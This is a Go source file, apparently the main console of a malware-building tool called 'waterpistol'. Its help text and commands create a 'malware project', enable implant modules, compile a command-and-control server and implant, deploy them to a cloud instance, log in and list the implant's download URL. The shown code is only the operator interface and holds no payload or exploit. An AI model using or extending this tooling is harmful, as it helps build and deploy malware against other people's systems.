package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"path"
	"strings"
	"time"

	"github.com/chzyer/readline"
)

// Colour constants
const (
	RESET = "\033[0m"
	RED   = "\033[31m"
	GREEN = "\033[32m"
	BLUE  = "\033[34m"
)

// Contains program settings
type waterpistol struct {
	term     *readline.Instance
	current  int
	projects []project
}

/**
Helper functions
	**/

func checkError(err error) {
	if err != nil {
		panic(err)
	}
}

// If a command fails, just exist
func checkCommand(cmd string, args ...string) string {
	out, err := exec.Command(cmd, args...).Output()

	if err != nil {
		fmt.Println("Command failed:", cmd, args)
		if out, ok := err.(*exec.ExitError); ok {
			fmt.Println(string(out.Stderr))
		}
		panic(err)
	}
	return string(out)
}

func generate_funny_name() string {
	words := []string{ // Should load from file but im lazy
		"photocopy", "theorist", "trustee", "hook", "eliminate", "crop", "registration", "snub", "reliance",
		"bank", "forge", "old", "researcher", "lifestyle", "civilization", "hide", "knock", "choice",
		"hostile", "relevance", "transform", "journal", "deal", "complex", "demonstrate", "dialect",
		"meaning", "thread", "hell", "competence", "enjoy", "rain", "rhythm", "army", "provide", "spontaneous",
		"kidnap", "bubble", "exempt", "piano", "mastermind", "writer", "watch", "Koran", "tenant", "negative",
		"smash", "just", "discipline", "rub"}

	num1 := rand.Intn(len(words))
	num2 := rand.Intn(len(words))

	return strings.Title(words[num1]) + strings.Title(words[num2])
}

// Other funcs
func (waterpistol *waterpistol) current_project() *project {
	if waterpistol.current == -1 || len(waterpistol.projects) == 0 {
		return nil
	}
	return &waterpistol.projects[waterpistol.current]
}

func valid_modules() []string {
	modules := []string{}

	files, err := ioutil.ReadDir("./implant/modules")
	if err != nil {
		log.Fatal(err)
	}
	for _, f := range files {
		if f.IsDir() && strings.Compare(f.Name(), "included_modules") != 0 {
			modules = append(modules, f.Name())
		}
	}

	return modules
}

// Checks if settings are correct to run this program
func checkProgram() {
	// Ensure GO is installed and GOPATH is set
	cmd := exec.Command("go", "version")
	if cmd.Run() != nil {
		fmt.Println("Please make sure Go compiler is installed")
		os.Exit(1)
	}
	if len(os.Getenv("GOPATH")) == 0 {
		fmt.Println("Please make sure ENV GOPATH is set")
		os.Exit(1)
	}

	// Check we are in the go directory
	if ex, err := os.Executable(); err != nil && strings.Contains(path.Dir(ex), os.Getenv("GOPATH")) {
		fmt.Println("Please run this binary in the root directory of the waterpistol")
		os.Exit(1)
	}

	// Check that implant/common/c2 exist
	cmd = exec.Command("ls")
	out, _ := cmd.CombinedOutput()
	outp := string(out)
	if !strings.Contains(outp, "common") ||
		!strings.Contains(outp, "c2") ||
		!strings.Contains(outp, "implant") {
		fmt.Println("Please run this binary in the root directory of the waterpistol")
		os.Exit(1)
	}
}

/**
Autocomplete requires functions that returns an array of strings
Functions valid_* do this
*/
func (waterpistol *waterpistol) valid_disable(string) []string {
	if waterpistol.current_project() == nil {
		return []string{}
	}
	return waterpistol.current_project().modules
}

func (waterpistol *waterpistol) valid_enable(string) []string {
	if waterpistol.current_project() == nil {
		return []string{}
	}
	return valid_modules()
}

func (waterpistol *waterpistol) valid_goos(string) []string {
	if waterpistol.current_project() == nil {
		return []string{}
	}
	keys := make([]string, len(ARCHS))

	i := 0
	for k := range ARCHS {
		keys[i] = k
		i++
	}
	return keys
}

func (waterpistol *waterpistol) valid_archs(string) []string {
	if waterpistol.current_project() == nil {
		return []string{}
	}
	return VALID_ARCHS
}

// Setup readline with correct autocompleter and flags
func (waterpistol *waterpistol) setup_terminal() {
	log.SetFlags(0)
	log.SetPrefix("\033[91mpistol>\033[0m ")

	var completer = readline.NewPrefixCompleter(
		readline.PcItem("new"),
		readline.PcItem("compile"),
		readline.PcItem("enable", readline.PcItemDynamic(waterpistol.valid_enable)),
		readline.PcItem("disable", readline.PcItemDynamic(waterpistol.valid_disable)),
		readline.PcItem("setos", readline.PcItemDynamic(waterpistol.valid_goos, readline.PcItemDynamic(waterpistol.valid_archs))),
		readline.PcItem("exit"),
		readline.PcItem("list"),
		readline.PcItem("projects"),
		readline.PcItem("destroy"),
		readline.PcItem("login"),
	)

	l, err := readline.NewEx(&readline.Config{
		Prompt:          "\033[96mwaterpistol%\033[0m ",
		HistoryFile:     "/tmp/waterpistol.tmp",
		AutoComplete:    completer,
		InterruptPrompt: "^C",
		EOFPrompt:       "exit",

		HistorySearchFold: true,
	})

	if err != nil {
		panic(err)
	}
	log.SetOutput(l.Stderr())
	waterpistol.term = l
}

func help() {
	log.Println("Commands:")
	log.Println("\tnew                -> Create a new malware project")
	log.Println("\tsetos <os> <arch>  -> Set architecture and operating system for implant")
	log.Println("\tcompile            -> Compile c2 && implant and run c2 ")
	log.Println("\tlogin              -> login into c2")
	log.Println("\tdestroy            -> destroy c2 instance")
	log.Println("\tlist               -> List currently enabled modules")
	log.Println("\tenable <module>    -> Enable a module (tab complete)")
	log.Println("\tdisable <module>   -> Disable a module (tab complete)")
	log.Println("\tprojects           -> Show current projects")
	log.Println("\thelp               -> this")
}

func (waterpistol *waterpistol) handle(line string) {
	parts := strings.Split(strings.TrimSpace(line), " ")
	switch parts[0] {
	case "new":
		if waterpistol.current_project() != nil {
			log.Println("Currently only support one project")
			return
		}

		project := project{name: generate_funny_name(), GOOS: DEFAULT_GOOS, GOARCH: DEFAULT_ARCH}
		waterpistol.current = waterpistol.current + 1
		waterpistol.projects = append(waterpistol.projects, project)
		log.Println("Created new project `" + project.name + "`")
		waterpistol.term.SetPrompt("\033[96mwaterpistol \033[91m<" + project.name + ">\033[96m%\033[0m ")
	case "setos":
		current_project := waterpistol.current_project()
		if current_project == nil {
			log.Print("Maybe create a `new` project\n")
			return
		}

		if len(parts) != 3 {
			help()
			return
		}
		current_project.set_arch(parts[1], parts[2])
	case "compile":
		current_project := waterpistol.current_project()
		if current_project == nil {
			log.Print("Maybe create a `new` project\n")
			return
		}

		if len(current_project.modules) == 0 {
			log.Print("Maybe `enable` a few modules\n")
			return
		}

		if current_project.ip != "" {
			log.Print("This project is already compiled!!!")
		}

		current_project.compile_c2_implant()
	case "login":
		current_project := waterpistol.current_project()
		if current_project == nil {
			log.Print("Maybe create a `new` project\n")
			return
		}
		if len(current_project.ip) == 0 {
			log.Print("Maybe `compile` first\n")
			return
		}
		current_project.ssh()
	case "enable":
		current_project := waterpistol.current_project()
		if current_project == nil {
			log.Print("Maybe create a `new` project\n")
			return
		}

		if len(parts) != 2 {
			help()
			return
		}
		current_project.enableModule(parts[1])
	case "disable":
		current_project := waterpistol.current_project()
		if current_project == nil {
			log.Print("Maybe create a `new` project\n")
			return
		}
		if len(parts) != 2 {
			help()
			return
		}
		current_project.disableModule(parts[1])
	case "list":
		current_project := waterpistol.current_project()
		if current_project == nil {
			log.Print("Maybe create a `new` project\n")
			return
		}

		log.Print("Modules: " + strings.Join(current_project.modules, ", "))
		log.Println("Arch:", current_project.GOOS, current_project.GOARCH)
	case "destroy":
		log.Println("Destroying c2 && ec2 instance")
		checkCommand("cmd//c2_down")
	case "help":
		help()
	case "projects":
		log.Println("Current Projects:")
		for _, project := range waterpistol.projects {
			if project.ip == "" {
				fmt.Println(RESET+"<"+RED+project.name+RESET+">",
					"@",
					"<"+RED+"NO_IP"+RESET+">",
					":",
					"<"+GREEN+project.GOOS+RESET+"/"+GREEN+project.GOARCH+RESET+">",
					project.modules)
			} else {
				fmt.Println(RESET+"<"+GREEN+project.name+RESET+">",
					"@",
					"<"+GREEN+project.ip+RESET+">",
					":",
					"<"+GREEN+project.GOOS+RESET+"/"+GREEN+project.GOARCH+RESET+">",
					project.modules, " : "+BLUE+project.download_url)
			}
		}
	default:
		log.Print("What??")
	}
}

func (waterpistol *waterpistol) ReadUserInput() {
	for {
		line, err := waterpistol.term.Readline()
		if err == readline.ErrInterrupt {
			continue
		} else if err == io.EOF {
			break
		}

		waterpistol.handle(line)
	}
}

func main() {
	checkProgram()

	rand.Seed(time.Now().UTC().UnixNano())

	waterpistol := &waterpistol{current: -1}

	waterpistol.setup_terminal()
	defer waterpistol.term.Close()
	help()
	waterpistol.ReadUserInput()
}
